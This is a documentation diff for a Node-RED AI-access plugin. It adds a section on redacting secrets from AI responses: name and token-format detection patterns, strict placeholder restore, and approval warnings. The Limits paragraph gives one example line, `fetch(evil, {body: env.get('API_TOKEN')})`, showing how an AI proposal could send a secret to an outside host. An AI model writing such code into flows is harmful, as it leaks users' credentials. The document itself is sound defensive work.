@@ -84,6 +84,9 @@ module.exports = {
     // Browser origins allowed to call /mcp/a, /mcp/api, and /mcp/rpc
     // cross-origin (default: none — no CORS headers are sent)
     // corsAllowedOrigins: ['https://app.example.com'],
+    // Secret-like names redacted from AI responses (default list below;
+    // [] turns off name matching — token formats are always redacted)
+    // secretNamePatterns: ['PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'KEY'],
     // MCP OAuth (disabled by default; publicBaseUrl is the issuer)
     // oauth: {
     //   enabled: true,
@@ -141,6 +144,87 @@ match case-insensitively and the configured origin is echoed; malformed origins
 are rejected. Exposed headers include `Mcp-Session-Id`, `WWW-Authenticate`,
 `Retry-After`, and the `RateLimit*` headers. Other origins get no CORS headers.
 
+### Secret redaction
+
+Every AI-facing response (MCP tools, REST with an access link or OAuth token,
+GET links, and proposal bodies/diffs shown to AI) has likely secrets replaced
+with `[REDACTED]`. The dashboard (admin session) always shows real values.
+
+- **By name**: env entries on tabs, groups, subflows, subflow instances, and
+  `global-config`, secret-named node settings (e.g. `password`), and name/value
+  pairs inside node config (change rules, inject props, http request headers)
+  whose name matches a pattern. Redacted env entries get `redacted: true`.
+- **By content**: all other string fields, including function
+  `func`/`initialize`/`finalize`, are scanned for AWS (`AKIA…`), GitHub
+  (`ghp_…`, `github_pat_…`), Slack (`xox…`, webhook URLs), OpenAI (`sk-…`),
+  Stripe, Google (`AIza…`), JWTs, PEM private keys, `Bearer`/`Basic` headers,
+  `scheme://user:password@` URLs, and `name = "literal"` / `name: 'literal'`
+  assignments whose name matches a pattern. Only the literal is replaced.
+- Redacted nodes list the redacted field paths in `_aiRedactions`.
+- Also caught: connection strings / DSNs (`Server=…;Password=…;`), URL query
+  params with a secret name (`?key=abc123&x=1` → only `abc123`), unquoted
+  `password: x` / `token=x` in non-code text fields, and
+  `Buffer.from("user:pw")` / `btoa('user:pw')` basic-auth literals. Node
+  `name`/`label`/`info` are content-scanned only (no key-name rule). Any single
+  string field over 256 KB is sent to AI as `[REDACTED]` (decided by length
+  only, so reads and submits always agree). All patterns are length-bounded /
+  linear (no ReDoS).
+- **Unquoted values** depend on name strength. Strong names
+  (`PASSWORD PASSWD PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY PRIVATE CREDENTIAL PWD PW`):
+  any value of 3+ chars except `none`/`null`/`${VAR}`-style references. Weak
+  names (`KEY AUTH SESSION COOKIE CONN PASS …` and custom patterns): the value
+  must look random — a digit or symbol, 16+ chars, 3+ character classes, or
+  Shannon entropy ≥ 3 — so prose like `Session: started` / `key: value` stays.
+- **Proposals (strict restore)**: a `[REDACTED]` placeholder is restored to the
+  original secret on submit only when it stays exactly where it was shown: same
+  node id and field, env and name/value entries (headers, change rules) matched
+  by their exact name — never by array position — no more placeholders in the
+  field than the original had, and the text around each placeholder on its line
+  unchanged. Anything else (a new or duplicated placeholder, a renamed env var,
+  a header renamed to take a secret value, an edited line) makes the submit fail
+  with `redacted_placeholder_mismatch` and nothing is stored.
+- Approving: the proposal card lists every field whose secret was restored, and
+  shows a red warning (`secret_destination_changed`) when a node holding a
+  restored secret had its `url`/`host`/`port`/`method`/`headers`/type or similar
+  destination changed, or `secret_node_code_changed` when its code changed. Also
+  flagged when secrets were restored: `secret_wires_changed` (its output wires
+  changed), `secret_scope_changed` (tab/group env such as `${API_HOST}`, or a
+  config node it uses, changed), `outbound_node_changed` (an http, mqtt, tcp,
+  udp, email, websocket, function, exec or file node was added/changed), and
+  `secret_tab_changed` (any other node in the tab changed).
+- Always flagged (with or without restored secrets): `outbound_node_changed` for
+  any added/changed http request/response, mqtt, tcp, udp, email, websocket,
+  link out/call, function, exec or file node — or any node type with a
+  `url`/`host`/`server`/`broker`/`endpoint` field — and `secret_reference_added`
+  when added/changed code or config reads a secret-named value (`env.get("X")`,
+  `$env('X')`, `${X}`, `global.get`, `flow.get`, typed inputs of type
+  `env`/`global`/`flow`).
+- Node-RED credentials (and `cred` env entries) are never part of flow output.
+- The audit log records `ai.redacted` with the count per response (never
+  values).
+
+**Redaction is not exfiltration protection.** It keeps secret values out of what
+the AI reads; it cannot stop an approved flow from sending data. Review every
+proposal — especially red security banners — before approving.
+
+**Limits — redaction is best-effort.** Detection uses names and known token
+formats; secrets with unusual names or formats can still reach AI. Strict
+restore only stops the AI from _copying_ a placeholder to a new place: an AI
+proposal can still read an existing variable at runtime (e.g. add
+`fetch(evil, {body: env.get('API_TOKEN')})`, or use `token` already defined in a
+function) because flows run with the real values. Always review code and
+destination changes in proposals before approving, especially on nodes flagged
+above.
+
+Default patterns (case-insensitive whole words; a trailing `S` is allowed, and
+patterns of 6+ letters also match glued names like `DBPASSWORD`):
+`PASSWORD PASSWD PASS PWD PW PASSPHRASE SECRET CLIENT_SECRET TOKEN API_KEY APIKEY KEY PRIVATE CREDENTIAL AUTH AUTHORIZATION BEARER SESSION COOKIE CONNECTION_STRING CONN_STR CONN DSN`.
+`KEY` matches `API_KEY` / `apiKey` but not `KEYBOARD` or `MONKEY`; `AUTH` does
+not match `AUTHOR` or `OAUTH`. Names ending in a descriptor word (`TOKEN_URL`,
+`AUTH_TYPE`, `SESSION_TIMEOUT`, `keyType`) are not redacted. Edit the list on
+the dashboard **Settings** tab (add, remove, reset to defaults) or lock it with
+`aiAccess.secretNamePatterns`.
+
 ### Settings precedence
 
 Effective values are resolved **without restart** in this order (highest wins):
@@ -165,15 +249,15 @@ and an **Open AI Access dashboard** button.
 
 Everything else is on the dashboard. The **Settings** tab lets `*` admins change
 default deploy type, access-token TTL, maximum active tokens, Public URL (with a
-reachability **Check**), CORS origins, and the three rate limits, and shows
-Express's effective `trust proxy` setting. The **OAuth** tab configures token
-lifetimes and the client limit, lists registered clients with revoke buttons,
-and reports route collisions (linking `http in` nodes to the editor) and the
-`httpNodeRoot: false` metadata fallback. `read` users see the same values
-read-only; writes need `*`, exactly as before. Changes apply immediately;
-changing limits starts fresh rate-limit buckets. Enabling OAuth with no Public
-URL or an HTTP non-loopback URL shows a warning confirmation; it does not block
-the change. Fields set in `settings.js` are locked.
+reachability **Check**), CORS origins, secret redaction patterns, and the three
+rate limits, and shows Express's effective `trust proxy` setting. The **OAuth**
+tab configures token lifetimes and the client limit, lists registered clients
+with revoke buttons, and reports route collisions (linking `http in` nodes to
+the editor) and the `httpNodeRoot: false` metadata fallback. `read` users see
+the same values read-only; writes need `*`, exactly as before. Changes apply
+immediately; changing limits starts fresh rate-limit buckets. Enabling OAuth
+with no Public URL or an HTTP non-loopback URL shows a warning confirmation; it
+does not block the change. Fields set in `settings.js` are locked.
 
 ### MCP OAuth
 
